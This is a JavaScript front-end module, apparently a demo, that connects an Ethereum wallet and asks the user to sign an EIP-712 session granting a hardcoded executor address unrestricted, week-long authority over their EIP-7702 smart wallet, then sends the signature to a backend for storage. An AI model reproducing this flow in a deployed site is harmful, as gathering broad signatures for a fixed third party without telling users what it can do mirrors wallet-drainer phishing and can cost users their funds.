import { ethers } from 'ethers';

let provider = null;
let signer = null;
let userAddress = null;

// Backend API Configuration
const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || 'http://localhost:3001';

// Store session data via backend API
async function storeSessionDataViaAPI(userAddress, chainId, sessionData) {
    try {
        const response = await fetch(`${BACKEND_URL}/api/session/store`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                userAddress,
                chainId,
                sessionData
            })
        });

        const result = await response.json();

        if (!response.ok) {
            throw new Error(result.error || `HTTP error! status: ${response.status}`);
        }

        console.log('✅ Session data stored successfully via backend API:', result);
        return true;

    } catch (error) {
        console.error('❌ Failed to store session data via backend API:', error);
        return false;
    }
}

// Get session data via backend API
async function getSessionDataViaAPI(userAddress, chainId = null) {
    try {
        const url = chainId 
            ? `${BACKEND_URL}/api/session/${userAddress}/${chainId}`
            : `${BACKEND_URL}/api/session/${userAddress}`;
            
        const response = await fetch(url);
        const result = await response.json();

        if (!response.ok) {
            if (response.status === 404) {
                console.log('ℹ️ No session data found for user');
                return null;
            }
            throw new Error(result.error || `HTTP error! status: ${response.status}`);
        }

        console.log('✅ Session data retrieved successfully via backend API:', result);
        return result.data;

    } catch (error) {
        console.error('❌ Failed to retrieve session data via backend API:', error);
        return null;
    }
}

// Check backend health
async function checkBackendHealth() {
    try {
        const response = await fetch(`${BACKEND_URL}/health`);
        const result = await response.json();
        
        console.log('🏥 Backend health check:', result);
        return result.status === 'OK' && result.s3Connected;
        
    } catch (error) {
        console.error('❌ Backend health check failed:', error);
        return false;
    }
}

// Show message function
function showMessage(message, isError = false) {
    const messageBox = document.getElementById('messageBox');
    messageBox.textContent = message;
    messageBox.className = `mt-4 p-3 rounded text-center ${isError ? 'bg-red-100 text-red-700' : 'bg-green-100 text-green-700'}`;
    messageBox.classList.remove('hidden');
    
    // Hide message after 5 seconds
    setTimeout(() => {
        messageBox.classList.add('hidden');
    }, 5000);
}

// Connect wallet function
async function connectWallet() {
    try {
        // Check if window.ethereum is available
        if (!window.ethereum) {
            showMessage('No Ethereum wallet detected. Please install MetaMask or OKX Wallet.', true);
            return;
        }
        
        // Instantiate provider with ethers v6
        provider = new ethers.BrowserProvider(window.ethereum);
        
        // Request account access
        await provider.send("eth_requestAccounts", []);
        
        // Get signer and address
        signer = await provider.getSigner();
        userAddress = await signer.getAddress();
        
        // Check for EIP-7702 compatibility by checking if account has code
        const code = await provider.getCode(userAddress);
        const hasCode = code !== '0x';
        
        // Update UI
        document.getElementById('statusText').textContent = 'Wallet Connected!';
        document.getElementById('addressText').textContent = userAddress;
        
        // Update EIP-7702 status
        const eip7702StatusEl = document.getElementById('eip7702Status');
        if (hasCode) {
            eip7702StatusEl.textContent = 'EIP-7702 Status: Ready (Account has code)';
            eip7702StatusEl.className = 'text-sm mt-2 text-green-600 font-semibold';
        } else {
            eip7702StatusEl.textContent = 'EIP-7702 Status: Standard EOA (No code detected)';
            eip7702StatusEl.className = 'text-sm mt-2 text-yellow-600 font-semibold';
        }
        
        // Update buttons
        document.getElementById('connectButton').textContent = 'Connected';
        document.getElementById('connectButton').disabled = true;
        document.getElementById('signButton').disabled = false;
        
        showMessage('Wallet connected successfully!');
        
    } catch (error) {
        console.error('Connection error:', error);
        showMessage(`Connection failed: ${error.message}`, true);
    }
}

// Sign session data function
async function signSessionData() {
    try {
        if (!signer || !userAddress) {
            showMessage('Please connect your wallet first.', true);
            return;
        }
        
        // Check if wallet has code (is a smart wallet)
        const code = await provider.getCode(userAddress);
        const hasCode = code !== '0x';
        
        if (!hasCode) {
            showMessage('Wallet must be upgraded with EIP-7702 to use session signing.', true);
            return;
        }
        
        // Wallet Core contract address (ETH mainnet)
        const WALLET_CORE_ADDRESS = '0x80296FF8D1ED46f8e3C7992664D13B833504c2Bb';
        
        // Wallet Core ABI for getSessionTypedHash function
        const walletCoreAbi = [
            'function getSessionTypedHash(tuple(uint256 id, address executor, address validator, uint256 validUntil, uint256 validAfter, bytes preHook, bytes postHook, bytes signature) session) external view returns (bytes32)'
        ];
        
        // Create smart wallet contract instance
        const userSmartWallet = new ethers.Contract(userAddress, walletCoreAbi, provider);
        
        // Create session data structure matching the example
        const now = Math.floor(Date.now() / 1000);
        const session = {
            id: Math.floor(Math.random() * 1000000), // Random session ID for demo
            executor: '0x1e8e3a338046913149c84002e22744780200e3be', // Executor address
            validator: '0x0000000000000000000000000000000000000001', // SELF_VALIDATION_ADDRESS
            validUntil: now + 3600 * 24 * 7, // Valid for 1 week
            validAfter: now - 3600 * 24 * 7, // Valid from 1 week ago
            preHook: '0x', // No pre-hook
            postHook: '0x', // No post-hook
            signature: '0x' // Will be filled after signing
        };
        
        console.log('Session parameters:');
        console.log({
            id: session.id,
            executor: session.executor,
            validator: session.validator,
            validUntil: new Date(session.validUntil * 1000).toISOString(),
            validAfter: new Date(session.validAfter * 1000).toISOString()
        });
        
        // Get the EIP-712 typed hash from the smart wallet contract
        const sessionHashFromContract = await userSmartWallet.getSessionTypedHash(session);
        console.log('EIP-712 Typed Hash from contract:', sessionHashFromContract);
        
        // Set up EIP-712 domain and types for structured signing
        const chainId = (await provider.getNetwork()).chainId;
        
        // EIP-712 Domain matching the smart wallet contract
        const domain = {
            name: 'wallet-core',
            version: '1.0.0',
            chainId: Number(chainId),
            verifyingContract: userAddress // The smart wallet address
        };
        
        // EIP-712 Types matching the Session struct in the contract
        const types = {
            Session: [
                { name: 'wallet', type: 'address' },
                { name: 'id', type: 'uint256' },
                { name: 'executor', type: 'address' },
                { name: 'validator', type: 'address' },
                { name: 'validUntil', type: 'uint256' },
                { name: 'validAfter', type: 'uint256' },
                { name: 'preHook', type: 'bytes' },
                { name: 'postHook', type: 'bytes' }
            ]
        };
        
        // Session data for EIP-712 signing (includes wallet field)
        const sessionForSigning = {
            wallet: WALLET_CORE_ADDRESS, // The wallet implementation address
            id: session.id,
            executor: session.executor,
            validator: session.validator,
            validUntil: session.validUntil,
            validAfter: session.validAfter,
            preHook: session.preHook,
            postHook: session.postHook
        };
        
        console.log('Signing structured session data with EIP-712...');
        console.log('Domain:', domain);
        console.log('Session data:', sessionForSigning);
        
        // Request EIP-712 typed data signature from wallet
        const signature = await signer.signTypedData(domain, types, sessionForSigning);
        
        // Parse the signature to get r, s, v components
        const sigBytes = ethers.getBytes(signature);
        const r = ethers.hexlify(sigBytes.slice(0, 32));
        const s = ethers.hexlify(sigBytes.slice(32, 64));
        const v = sigBytes[64];
        
        // Pack signature as r,s,v like in the example
        session.signature = ethers.concat([r, s, ethers.toBeHex(v)]);
        
        console.log('Session signed by user:', session.signature);
        
        // Store session data in S3 after successful signing
        const storageSuccess = await storeSessionDataViaAPI(userAddress, Number(chainId), session);
        
        // Display session data and signature
        document.getElementById('signatureArea').classList.remove('hidden');
        document.getElementById('signatureText').textContent = JSON.stringify({
            signingMethod: 'EIP-712 Typed Data',
            domain: domain,
            sessionData: sessionForSigning,
            session: session,
            sessionHash: sessionHashFromContract,
            signature: session.signature,
            storedInS3: storageSuccess
        }, null, 2);
        
        const successMessage = storageSuccess 
            ? 'Session data signed successfully and stored via backend API!'
            : 'Session data signed successfully! (Backend storage failed - check console for details)';
        
        showMessage(successMessage, !storageSuccess);
        
    } catch (error) {
        console.error('Signing error:', error);
        if (error.code === 4001) {
            showMessage('User rejected the signing request.', true);
        } else if (error.message.includes('getSessionTypedHash')) {
            showMessage('Smart wallet contract does not support session signing. Please ensure wallet is properly upgraded.', true);
        } else if (error.message.includes('signTypedData')) {
            showMessage('Wallet does not support EIP-712 typed data signing. Please use a compatible wallet.', true);
        } else {
            showMessage(`Signing failed: ${error.message}`, true);
        }
    }
}

// Add event listeners when DOM is loaded
document.addEventListener('DOMContentLoaded', async () => {
    // Check backend health on page load
    const backendHealthy = await checkBackendHealth();
    
    if (!backendHealthy) {
        showMessage('⚠️ Backend server is not available. Session storage will be disabled.', true);
    }
    
    document.getElementById('connectButton').addEventListener('click', connectWallet);
    document.getElementById('signButton').addEventListener('click', signSessionData);
});